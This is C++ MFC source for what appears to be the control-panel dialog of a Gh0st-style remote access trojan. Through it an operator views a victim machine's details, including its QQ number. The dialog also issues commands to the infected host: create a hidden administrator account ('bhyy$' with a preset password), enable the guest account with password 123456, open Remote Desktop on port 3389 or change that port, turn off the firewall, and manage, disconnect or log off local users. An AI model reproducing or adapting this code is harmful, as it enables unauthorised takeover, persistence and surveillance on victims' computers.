// CSysinfo.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CSysinfo.h"
#include "afxdialogex.h"
#include"InputDlg.h"

// CSysinfo 对话框

IMPLEMENT_DYNAMIC(CSysinfo, CDialog)

CSysinfo::CSysinfo(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_SYSINFO, pParent)
{
	m_ruser = _T("bhyy$");
	m_rpass = _T("xX123456789.");
	m_rgroup = _T("Administrators");
	m_rport = _T("3389");

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

	ZeroMemory(&info, sizeof(MYSYSINFO));
}

CSysinfo::~CSysinfo()
{

}

void CSysinfo::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_INFO, m_info);
	DDX_Control(pDX, IDC_LIST_User, m_user);
	DDX_Control(pDX, IDC_LIST_STATUS, m_status);
	DDX_Text(pDX, IDC_PORT, m_rport);
	DDX_Text(pDX, IDC_EDIT_USER, m_ruser);
	DDX_Text(pDX, IDC_EDIT_PASS, m_rpass);
	DDX_Text(pDX, IDC_EDIT_GROUP, m_rgroup);
	DDX_Control(pDX, IDC_SYSTEM_TAB, m_system_tab);
	DDX_Control(pDX, IDC_BUTTON5, m_fhq);
	DDX_Control(pDX, IDC_BUTTON3, m_open3389);
	DDX_Control(pDX, IDC_BUTTON4, m_close3389);
}


BEGIN_MESSAGE_MAP(CSysinfo, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_SYSTEM_TAB, &CSysinfo::OnTcnSelchangeSystemTab)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_INFO, &CSysinfo::OnNMRClickListInfo)

ON_NOTIFY(NM_RCLICK, IDC_LIST_STATUS, &CSysinfo::OnNMRClickListStatus)
ON_NOTIFY(NM_RCLICK, IDC_LIST_User, &CSysinfo::OnNMRClickListUser)
ON_COMMAND(ID_INFO_32860, &CSysinfo::OnInfoShuaxin)
ON_COMMAND(ID_INFO_32861, &CSysinfo::OnCopy)
ON_COMMAND(ID_USER_32854, &CSysinfo::OnUserShuaxin)
ON_COMMAND(ID_USER_32855, &CSysinfo::OnUserStartUp)
ON_COMMAND(ID_USER_32856, &CSysinfo::OnUserDisabled)
ON_COMMAND(ID_USER_32857, &CSysinfo::OnUserRevise)
ON_COMMAND(ID_USER_32858, &CSysinfo::OnUserDel)
ON_COMMAND(ID_USER_32859, &CSysinfo::OnUserCopy)
ON_COMMAND(ID_Menu32851, &CSysinfo::OnStatusShuaxin)
ON_COMMAND(ID_STATUS_32852, &CSysinfo::OnStatusClose)
ON_COMMAND(ID_STATUS_32853, &CSysinfo::OnStatusOut)
ON_BN_CLICKED(IDC_BUTTON6, &CSysinfo::OnBnClickedButton6)
ON_BN_CLICKED(IDC_BUTTON2, &CSysinfo::OnBnClickedButton2)
ON_BN_CLICKED(IDC_BUTTON1, &CSysinfo::OnBnClickedButton1)
ON_BN_CLICKED(IDC_BUTTON3, &CSysinfo::OnBnClickedButton3)
ON_BN_CLICKED(IDC_BUTTON4, &CSysinfo::OnBnClickedButton4)
ON_BN_CLICKED(IDC_BUTTON5, &CSysinfo::OnBnClickedButton5)
END_MESSAGE_MAP()


// CSysinfo 消息处理程序


BOOL CSysinfo::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}


BOOL CSysinfo::OnInitDialog()
{
	CDialog::OnInitDialog();

	//设置标题
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 主机信息", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	initView();
	// TODO:  在此添加额外的初始化

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

/// <summary>
/// 初始化视图
/// </summary>
void CSysinfo::initView()
{
	//设置tab栏
	m_system_tab.InsertItem(0, _T("主机信息"));
	m_system_tab.InsertItem(1, _T("系统用户"));
	m_system_tab.InsertItem(2, _T("用户状态"));

	//设置主机信息的列表框
	m_info.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_info.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 80);
	m_info.InsertColumn(1, _T("信息"), LVCFMT_LEFT, 240);
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_CPU));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_NC));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_YP));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_FBL));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_TIME));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_QQ));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_MAC));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_XK));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_LJ));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_HJ));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_YY));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_YC));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_FHQ));
	m_info.SetImageList(&m_ImgList, LVSIL_SMALL);

	//设置用户列表
	CRect rect; m_user.GetClientRect(&rect);
	int nColInterval = rect.Width() / 3;
	m_user.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_user.InsertColumn(0, _T("用户名"), LVCFMT_LEFT, nColInterval);
	m_user.InsertColumn(1, _T("用户组"), LVCFMT_LEFT, nColInterval);
	m_user.InsertColumn(2, _T("状态"), LVCFMT_LEFT, nColInterval);

	//设置用户状态
	m_status.GetClientRect(&rect);
	nColInterval = rect.Width() / 4;
	m_status.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_status.InsertColumn(0, _T("状态"), LVCFMT_LEFT, nColInterval);
	m_status.InsertColumn(1, _T("用户名"), LVCFMT_LEFT, nColInterval);
	m_status.InsertColumn(2, _T("客户端名"), LVCFMT_LEFT, nColInterval);
	m_status.InsertColumn(3, _T("会话"), LVCFMT_LEFT, nColInterval);
	
	ShowSysinfoList();
	ShowSelectWindow();

}

void CSysinfo::ShowSelectWindow()
{
	switch (m_system_tab.GetCurSel())
	{
		case 0:
			m_info.ShowWindow(SW_SHOW);
			m_user.ShowWindow(SW_HIDE);
			m_status.ShowWindow(SW_HIDE);
			if (m_info.GetItemCount() == 0)
				GetSysinfoList();
			break;
		case 1:
			m_info.ShowWindow(SW_HIDE);
			m_user.ShowWindow(SW_SHOW);
			m_status.ShowWindow(SW_HIDE);

			if (m_user.GetItemCount() == 0)
				GetSevList();
			break;
		case 2:
			m_info.ShowWindow(SW_HIDE);
			m_user.ShowWindow(SW_HIDE);
			m_status.ShowWindow(SW_SHOW);
			if (m_status.GetItemCount() == 0)
				GetWtsmList();
			break;
	}
}

void CSysinfo::GetSysinfoList()
{
	BYTE bToken = COMMAND_SEND_SYSINFO;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
void CSysinfo::GetSevList()
{
	BYTE bToken = COMMAND_SLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
void CSysinfo::GetWtsmList()
{
	BYTE bToken = COMMAND_WTSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSysinfo::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SYSINFOLIST:
		ShowSysinfoList();
		break;
	case TOKEN_ADD_SUCCESS:
		MessageBox(_T("添加账户成功!"));
		break;
	case TOKEN_ADD_ERROR:
		MessageBox(_T("添加账户失败!"));
		break;
	case TOKEN_DEL_SUCCESS:
		MessageBox(_T("删除账户成功!"));
		break;
	case TOKEN_DEL_ERROR:
		MessageBox(_T("删除账户失败!"));
		break;
	case TOKEN_STATE_ERROR:
		MessageBox(_T("用户状态更改失败!"));
		break;
	case TOKEN_STATE_SUCCESS:
		MessageBox(_T("用户状态更改成功!"));
		break;
	case TOKEN_USER_CLOSE_SUCCESS:
		MessageBox(_T("断开成功!"));
		break;
	case TOKEN__USER_CLOSE_ERROR:
		MessageBox(_T("断开失败!"));
		break;
	case TOKEN_OFF_SUCCESS:
		MessageBox(_T("注销成功!"));
		break;
	case TOKEN_OFF_ERROR:
		MessageBox(_T("注销失败!"));
		break;
	case TOKEN_OPEN_SUCCESS:				//3389开关
		MessageBox(_T("开启成功!"));
		m_open3389.EnableWindow(0);
		m_close3389.EnableWindow(1);
		break;
	case TOKEN_OPEN_ERROR:
		MessageBox(_T("开启失败!"));
		break;
	case TOKEN_CLOSE_SUCCESS:
		MessageBox(_T("关闭成功!"));
		m_open3389.EnableWindow(1);
		m_close3389.EnableWindow(0);
		break;
	case TOKEN_CLOSE_ERROR:
		MessageBox(_T("关闭失败!"));
		break;
	case TOKEN_SLIST:					//显示用户信息
		ShowSevList();
		break;
	case TOKEN_WTSLIST:				//显示用户状态信息
		ShowWtsList();
		break;
	case TOKEN_CHANGE_PSAA_SUCCESS:
		MessageBox(_T("修改密码成功!"));
		break;
	case TOKEN_CHANGE_PSAA_ERROR:
		MessageBox(_T("修改密码失败!"));
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

/// <summary>
/// 显示用户活动列表
/// </summary>
void CSysinfo::ShowWtsList()
{
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));

	char* ConnectionState;
	char* UserName;
	char* DomainName;
	char* ProtocolType;

	DWORD	dwOffset = 0;
	CString str;
	m_status.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{

		ConnectionState = lpBuffer + dwOffset;
		m_status.InsertItem(i, ConnectionState);
		dwOffset += lstrlen(ConnectionState) + 1;

		UserName = lpBuffer + dwOffset;
		m_status.SetItemText(i, 1, UserName);
		dwOffset += lstrlen(UserName) + 1;

		DomainName = lpBuffer + dwOffset;
		m_status.SetItemText(i, 2, DomainName);
		dwOffset += lstrlen(DomainName) + 1;

		ProtocolType = lpBuffer + dwOffset;
		m_status.SetItemText(i, 3, ProtocolType);
		dwOffset += lstrlen(ProtocolType) + 1;

		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		m_status.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD) + 1;
	}
}

/// <summary>
/// 显示用户列表
/// </summary>
void CSysinfo::ShowSevList()
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char* lpTitle = NULL;
	m_user.DeleteAllItems();
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		str = (char*)lpBuffer + dwOffset;
		m_user.InsertItem(i, str);
		dwOffset += str.GetLength() + 1;

		str = (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength() + 1;

		m_user.SetItemText(i, 1, str);
		str = (char*)lpBuffer + dwOffset;

		dwOffset += str.GetLength() + 1;
		m_user.SetItemText(i, 2, str);
	}

}

/// <summary>
/// 获取系统信息
/// </summary>
void CSysinfo::ShowSysinfoList()
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&info, lpBuffer, sizeof(MYSYSINFO));

	m_info.SetRedraw(FALSE);//禁止闪烁
	m_info.DeleteAllItems();

	CString strMemory, strDriveSize;
	strMemory.Format("可用:%dMB", info.szMemoryFree);
	strDriveSize.Format("可用:%ldG", info.szDriveFreeSize);

	m_info.InsertItem(0, _T("CPU"), 0);
	m_info.InsertItem(1, _T("可用内存"), 1);
	m_info.InsertItem(2, _T("可用硬盘"), 2);
	m_info.InsertItem(3, _T("分辨率"), 3);
	m_info.InsertItem(4, _T("活动时间"), 4);
	m_info.InsertItem(5, _T("QQ号"), 5);
	m_info.InsertItem(6, _T("MAC"), 6);
	m_info.InsertItem(7, _T("显卡"), 7);
	m_info.InsertItem(8, _T("程序路径"), 8);
	m_info.InsertItem(9, _T("运行环境"), 9);
	m_info.InsertItem(10, _T("系统语言"), 10);
	m_info.InsertItem(11, _T("远程服务"), 11);
	m_info.InsertItem(12, _T("防火墙"), 12);

	CString str;
	m_info.SetItemText(0, 1, info.szCpuInfo);
	m_info.SetItemText(1, 1, strMemory);
	m_info.SetItemText(2, 1, strDriveSize);
	m_info.SetItemText(3, 1, info.szScrSize);
	m_info.SetItemText(4, 1, info.szActiveTime);
	m_info.SetItemText(5, 1, info.szQq);
	m_info.SetItemText(6, 1, info.szMac);
	str.Format("%s 显存:%d M", info.szGraphics, info.Memory7);
	m_info.SetItemText(7, 1, str);
	m_info.SetItemText(8, 1, info.Program);
	m_info.SetItemText(9, 1, info.environment);
	str = info.lpLCData;
	m_info.SetItemText(10, 1, str);
	
	str = info.rport;
	m_info.SetItemText(11, 1, str.IsEmpty()?"未开启": str + " (开启中)");

	if (str.IsEmpty())
	{
		m_close3389.EnableWindow(0);
	}
	else
	{
		m_open3389.EnableWindow(0);
	}

	m_info.SetItemText(12, 1, info.qiang);

	str = info.qiang;

	if (str.Find("关闭") != -1 || str.Find("权限") != -1)
	{
		m_fhq.EnableWindow(0);
	}

	//更新窗口
	m_info.SetRedraw(TRUE);
	m_info.Invalidate();
	m_info.UpdateWindow();
	//SetDlgItemText(IDC_ADDR, IPAddress);
	//SetDlgItemText(IDC_REMOTE_PORT, m_SysInfo.szRemotePort);
}

void CSysinfo::OnClose()
{
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}

/// <summary>
/// tab切换
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSysinfo::OnTcnSelchangeSystemTab(NMHDR* pNMHDR, LRESULT* pResult)
{
	ShowSelectWindow();
	*pResult = 0;

}

/// <summary>
/// 主机信息右键
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSysinfo::OnNMRClickListInfo(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	if (m_user.IsWindowVisible())
		return;
	else if (m_status.IsWindowVisible())
		return;

	*pResult = 0;
	CMenu	popup;
	popup.LoadMenu(IDR_INFO);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(0, p.x, p.y, this);

	*pResult = 0;
}




/// <summary>
/// 活动用户列表右键
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSysinfo::OnNMRClickListStatus(NMHDR* pNMHDR, LRESULT* pResult)
{
		if (m_info.IsWindowVisible())
			return;
		else if (m_user.IsWindowVisible())
			return;
	
		CMenu	popup;
		popup.LoadMenu(IDR_STATUS);
		CMenu* pM = popup.GetSubMenu(0);
		CPoint	p;
		GetCursorPos(&p);
		pM->TrackPopupMenu(0, p.x, p.y, this);
		*pResult = 0;
	*pResult = 0;
}

/// <summary>
/// 用户列表右键
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSysinfo::OnNMRClickListUser(NMHDR* pNMHDR, LRESULT* pResult)
{
		if (m_info.IsWindowVisible())
			return;
		else if (m_status.IsWindowVisible())
			return;
	
		CMenu	popup;
		popup.LoadMenu(IDR_USER);
		CMenu* pM = popup.GetSubMenu(0);
		CPoint	p;
		GetCursorPos(&p);
		pM->TrackPopupMenu(0, p.x, p.y, this);
		// TODO: 在此添加控件通知处理程序代码
		*pResult = 0;
}

/// <summary>
/// 主机信息刷新
/// </summary>
void CSysinfo::OnInfoShuaxin()
{
	GetSysinfoList();
}

void SetClipboardTexts1(CString& Data)
{
	if (OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if (htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

/// <summary>
/// 复制数据
/// </summary>
void CSysinfo::OnCopy()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_info.IsWindowVisible())
		pListCtrl = &m_info;
	else if (m_user.IsWindowVisible())
		pListCtrl = &m_user;
	else if (m_status.IsWindowVisible())
		pListCtrl = &m_status;
	else
		return;


	POSITION pos = pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;

	if (pos == NULL)
	{
		AfxMessageBox(_T("请先选择要复制的内容"));
		return;
	}
	else
	{
		while (pos)
		{
			Name = "";
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			for (int i = 0; i < pListCtrl->GetHeaderCtrl()->GetItemCount(); i++)
			{
				Name += pListCtrl->GetItemText(nItem, i);
				Name += "|";
			}
			Data += Name;
			Data += "\r\n";
		}
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardTexts1(Data);
	MessageBox(_T("信息已复制到剪切板"), _T("提示"), MB_ICONINFORMATION);
}

/// <summary>
/// 用户列表菜单刷新
/// </summary>
void CSysinfo::OnUserShuaxin()
{
	GetSevList();
}

/// <summary>
/// 启用用户
/// </summary>
void CSysinfo::OnUserStartUp()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_user.IsWindowVisible())
		pListCtrl = &m_user;
	else
		return;

	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	CString Data;
	CString Name;

	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_ACITVEUSER;
	dwOffset = 1;

	if (pos == NULL)
	{
		return;
	}
	else
	{
		while (pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1) * sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1) * sizeof(TCHAR);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

/// <summary>
/// 禁用用户
/// </summary>
void CSysinfo::OnUserDisabled()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_user.IsWindowVisible())
		pListCtrl = &m_user;
	else
		return;

	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	CString Data;
	CString Name;

	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_DISABLEEUSER;
	dwOffset = 1;

	if (pos == NULL)
	{
		return;
	}
	else
	{
		while (pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1) * sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1) * sizeof(TCHAR);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

/// <summary>
/// 修改密码
/// </summary>
void CSysinfo::OnUserRevise()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_user.IsWindowVisible())
		pListCtrl = &m_user;
	else
		return;

	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	CInputDialog	dlg;
	dlg.Init(_T("修改密码"), _T("请输入要修改的密码密码:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();

	CString Data;
	CString Name;

	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_NET_CHANGE_PASS;
	dwOffset = 1;

	if (pos == NULL)
	{
		AfxMessageBox(_T("请先选择要修改密码的用户"));
		return;
	}
	else
	{
		while (pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1) * sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1) * sizeof(TCHAR);

		memcpy(lpBuffer + dwOffset, dlg.m_str.GetBuffer(0), (dlg.m_str.GetLength() + 1) * sizeof(TCHAR));
		dwOffset += (dlg.m_str.GetLength() + 1) * sizeof(TCHAR);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

/// <summary>
/// 删除用户
/// </summary>
void CSysinfo::OnUserDel()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_user.IsWindowVisible())
		pListCtrl = &m_user;
	else
		return;

	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	CString Data;
	CString Name;

	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_DELUSER;
	dwOffset = 1;

	if (pos == NULL)
	{
		AfxMessageBox(_T("请先选择要删除的用户"));
		return;
	}
	else
	{
		while (pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1) * sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1) * sizeof(TCHAR);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

/// <summary>
/// 用户列表复制
/// </summary>
void CSysinfo::OnUserCopy()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_info.IsWindowVisible())
		pListCtrl = &m_info;
	else if (m_user.IsWindowVisible())
		pListCtrl = &m_user;
	else if (m_status.IsWindowVisible())
		pListCtrl = &m_status;
	else
		return;


	POSITION pos = pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;

	if (pos == NULL)
	{
		AfxMessageBox(_T("请先选择要复制的内容"));
		return;
	}
	else
	{
		while (pos)
		{
			Name = "";
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			for (int i = 0; i < pListCtrl->GetHeaderCtrl()->GetItemCount(); i++)
			{
				Name += pListCtrl->GetItemText(nItem, i);
				Name += "|";
			}
			Data += Name;
			Data += "\r\n";
		}
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardTexts1(Data);
	MessageBox(_T("信息已复制到剪切板"), _T("提示"), MB_ICONINFORMATION);
}

/// <summary>
/// 活动用户列表刷新
/// </summary>
void CSysinfo::OnStatusShuaxin()
{
	GetWtsmList();
}

/// <summary>
/// 用户断开连接
/// </summary>
void CSysinfo::OnStatusClose()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_status.IsWindowVisible())
		pListCtrl = &m_status;
	else
		return;

	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_WTS_Disconnect;

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	int	nItem = 0;
	if (pos == NULL)
	{
		AfxMessageBox(_T("请先选择要断开的用户"));
		return;
	}
	else
	{
		while (pos) //so long as we have a valid POSITION, we keep iterating
		{
			nItem = pListCtrl->GetNextSelectedItem(pos);
			DWORD dwProcessID = pListCtrl->GetItemData(nItem);
			memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
			dwOffset += sizeof(DWORD);
		}
	}

	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

/// <summary>
/// 用户注销
/// </summary>
void CSysinfo::OnStatusOut()
{
	// TODO: Add your command handler code here
	CListCtrl* pListCtrl = NULL;
	if (m_status.IsWindowVisible())
		pListCtrl = &m_status;
	else
		return;

	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_WTS_Logoff;

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	int	nItem = 0;
	if (pos == NULL)
	{
		AfxMessageBox(_T("请先选择要断开的用户"));
		return;
	}
	else
	{
		while (pos) //so long as we have a valid POSITION, we keep iterating
		{
			nItem = pListCtrl->GetNextSelectedItem(pos);
			DWORD dwProcessID = pListCtrl->GetItemData(nItem);
			memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
			dwOffset += sizeof(DWORD);
		}
	}

	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


/// <summary>
///启用临时用户
/// </summary>
void CSysinfo::OnBnClickedButton6()
{
	BYTE	bToken = COMMAND_GUEST;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	MessageBox(_T("命令已经发送,初始化密码为123456"), _T("提示"));
}

/// <summary>
/// 创建账号
/// </summary>
void CSysinfo::OnBnClickedButton2()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString Username, Password, Administrators;

	GetDlgItem(IDC_EDIT_USER)->GetWindowText(Username);
	GetDlgItem(IDC_EDIT_PASS)->GetWindowText(Password);
	GetDlgItem(IDC_EDIT_GROUP)->GetWindowText(Administrators);
	UpdateData(TRUE);

	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_NET_USER;
	dwOffset = 1;

	memcpy(lpBuffer + dwOffset, Username.GetBuffer(0), (Username.GetLength() + 1) * sizeof(TCHAR));
	dwOffset += (Username.GetLength() + 1) * sizeof(TCHAR);

	memcpy(lpBuffer + dwOffset, Password.GetBuffer(0), (Password.GetLength() + 1) * sizeof(TCHAR));
	dwOffset += (Password.GetLength() + 1) * sizeof(TCHAR);

	memcpy(lpBuffer + dwOffset, Administrators.GetBuffer(0), (Administrators.GetLength() + 1) * sizeof(TCHAR));
	dwOffset += (Administrators.GetLength() + 1) * sizeof(TCHAR);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

/// <summary>
/// 修改端口
/// </summary>
void CSysinfo::OnBnClickedButton1()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strPort;
	GetDlgItemText(IDC_PORT, strPort);
	int nPacketLength = 1 + strPort.GetLength() * 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_CHANGE_PORT;
	memcpy(lpPacket + 1, strPort.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete[]lpPacket;
}

/// <summary>
/// 开启3389
/// </summary>
void CSysinfo::OnBnClickedButton3()
{
	// TODO: Add your control notification handler code here

	BYTE	lpPacket[3] =  { 0 };
	lpPacket[0] = COMMAND_OPEN_3389;
	lpPacket[1] = 0;
	m_iocpServer->Send(m_pContext, lpPacket, sizeof(lpPacket));

}

/// <summary>
/// 关闭3389
/// </summary>
void CSysinfo::OnBnClickedButton4()
{
	BYTE	lpPacket[3] = { 0 };
	lpPacket[0] = COMMAND_CLOSE_3389;
	lpPacket[1] = 1;
	m_iocpServer->Send(m_pContext, lpPacket, sizeof(lpPacket));
}

/// <summary>
/// 关闭防火墙
/// </summary>
void CSysinfo::OnBnClickedButton5()
{
	BYTE	bToken = COMMAND_STOPFIRE;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}
